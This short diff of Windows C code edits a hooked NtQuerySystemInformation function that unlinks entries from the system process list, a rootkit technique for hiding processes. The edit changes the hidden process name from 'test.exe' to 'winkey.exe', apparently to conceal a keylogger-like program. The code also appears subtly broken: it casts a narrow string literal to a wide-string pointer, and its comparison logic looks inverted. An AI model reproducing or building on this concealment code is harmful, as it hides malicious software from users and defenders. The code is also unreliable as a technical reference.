@@ -18,7 +18,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
         {
             sysProcInfoCurr = sysProcInfoNext;
             sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)((PUCHAR)sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
-            if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"test.exe"))
+            if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"winkey.exe"))
             {
                 Mylog(sysProcInfoNext->ImageName.Buffer, 1, TRUE);
                 if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
